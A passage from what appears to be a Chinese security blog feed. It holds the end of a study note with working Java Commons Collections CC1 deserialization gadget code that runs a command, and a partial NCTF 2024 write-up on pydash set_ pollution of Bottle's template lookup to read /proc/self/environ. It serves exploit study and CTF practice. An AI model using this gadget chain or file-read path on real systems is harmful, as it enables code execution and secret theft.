class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">//添加此行代码，这里解决问题三</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">        <span class="comment">//上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;gxngxngxn&quot;</span>); <span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap); <span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;D://CC1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D://CC1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用链如下："><a href="#利用链如下：" class="headerlink" title="利用链如下："></a>利用链如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()//入口类</span><br><span class="line">    -&gt;AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line">        -&gt;TransformedMap.checkSetValue()</span><br><span class="line">            -&gt;ChainedTransformer.transform()</span><br><span class="line">                -&gt;InvokerTransformer.transform()//执行类</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Serialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pydash set原型链污染漏洞解析</title>
      <link href="/2025/04/08/Pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"/>
      <url>/2025/04/08/Pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在nctf中遇到了一pydash的题目，是没见过的知识，所以写一篇文章复现分析一下。</p><h2 id="2024-nctf"><a href="#2024-nctf" class="headerlink" title="2024-nctf"></a>2024-nctf</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8999</span>)</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们拿到附件的源码。可以看到这里有两个关键的路由<code>/setValue</code>和<code>/render</code>，既然是要分析原型链污染，那么我们就主要关注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_(obj,path,value)</span><br></pre></td></tr></table></figure><p>这个调用，追溯一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj: T, path: PathT, value: t.<span class="type">Any</span></span>) -&gt; T:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj: Object to modify.</span></span><br><span class="line"><span class="string">        path: Target path to set value to.</span></span><br><span class="line"><span class="string">        value: Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &quot;a.b.c&quot;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &quot;a.0.c&quot;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &quot;[2][0]&quot;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &quot;a.b[0].c&quot;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure><p>大体作用就是传入一个对象obj，一个path属性名以及一个value值。就可以改掉obj对象中的path属性的值。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;test&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.score = <span class="number">0</span></span><br><span class="line">a = Test()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;修改前<span class="subst">&#123;a.name&#125;</span>&quot;</span>)</span><br><span class="line">pydash.set_(a, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;test2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;修改后<span class="subst">&#123;a.name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行效果：</p><p><img src="/img/pydash-set-chain-contamination/image-20250408161743852.png" alt="image-20250408161743852"></p><p> 根据源码中的提示，我们知道，flag在环境变量中，所以我们想读取flag可以通过读取<code>/proc/self/environ</code>文件来读取flag。那么我们的思路就清晰了，在<code>/render</code>路由中，调用了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bottle.template(path)</span><br></pre></td></tr></table></figure><p>我们就可以通过修改渲染模板中的某个记录了模板路径的变量，来实现读取<code>environ</code>文件。那么我们现在追溯一下这个template方法，寻找一下符合条件的变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get a rendered template as a string iterator.</span></span><br><span class="line"><span class="string">    You can use a name, a filename or a template string as first parameter.</span></span><br><span class="line"><span class="string">    Template rendering arguments can be passed as dictionaries</span></span><br><span class="line"><span class="string">    or directly (as keyword arguments).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br></pre></td></tr></table></figure><p>我们关注这一行代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br></pre></td></tr></table></figure><p>这里的作用是获取模板的渲染引擎，可以看到默认获取的是<code>SimpleTemplate</code>，<code>lookup</code>也就是模板的搜索路径，也就是<code>TEMPLATE_PATH</code>这个变量，默认值为：<code>[&#39;./&#39;, &#39;./views/&#39;]</code>，所以这里会从lookup所指示的目录中获取对应的模板文件，然后交给<code>SimpleTemplate</code>去解析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">    TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br></pre></td></tr></table></figure><p>这里是一个切换通过模板渲染还是字符串渲染的判断逻辑，跟进解析器。由于传入的模板路径而不是字符串，所以这里会通过lookup这个参数去寻找对应目录下的模板文件，读取后再交给解析器解析。</p><p><img src="/img/pydash-set-chain-contamination/image-20250408165124018.png" alt="image-20250408165124018"></p><p>其中<code>name</code>就是我们传入的<code>path</code>参数，假设我们传入的参数<code>path=test</code>。获取到lookup的路径后，进入<code>search</code>方法最后把<code>name</code>拼接到所有的路径中并尝试读取模板文件。</p><p><img src="/img/pydash-set-chain-contamination/image-20250408165310108.png" alt="image-20250408165310108"></p><p>当读取到文件内容后，就会交给prepare</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTemplate</span>(<span class="title class_ inherited__">BaseTemplate</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prepare</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                escape_func=html_escape,</span></span><br><span class="line"><span class="params">                noescape=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                syntax=<span class="literal">None</span>, **ka</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cache = &#123;&#125;</span><br><span class="line">        enc = <span class="variable language_">self</span>.encoding</span><br><span class="line">        <span class="variable language_">self</span>._<span class="built_in">str</span> = <span class="keyword">lambda</span> x: touni(x, enc)</span><br><span class="line">        <span class="variable language_">self</span>._escape = <span class="keyword">lambda</span> x: escape_func(touni(x, enc))</span><br><span class="line">        <span class="variable language_">self</span>.syntax = syntax</span><br><span class="line">        <span class="keyword">if</span> noescape:</span><br><span class="line">            <span class="variable language_">self</span>._<span class="built_in">str</span>, <span class="variable language_">self</span>._escape = <span class="variable language_">self</span>._escape, <span class="variable language_">self</span>._<span class="built_in">str</span></span><br></pre></td></tr></table></figure><p>这个方法的作用就是初始化模板的字符处理逻辑，支持 HTML 转义或直接输出原始 HTML，也就是解析这个传入的template变成html，然后回到template结尾。进入render方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Render the template using keyword arguments as local variables. &quot;&quot;&quot;</span></span><br><span class="line">    env = &#123;&#125;</span><br><span class="line">    stdout = []</span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args:</span><br><span class="line">        env.update(dictarg)</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    <span class="variable language_">self</span>.execute(stdout, env)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(stdout)</span><br></pre></td></tr></table></figure><p>继续追溯execute方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, _stdout, kwargs</span>):</span><br><span class="line">    env = <span class="variable language_">self</span>.defaults.copy()</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    env.update(&#123;</span><br><span class="line">        <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">        <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">        <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">        <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">        <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">        <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">        <span class="string">&#x27;get&#x27;</span>: 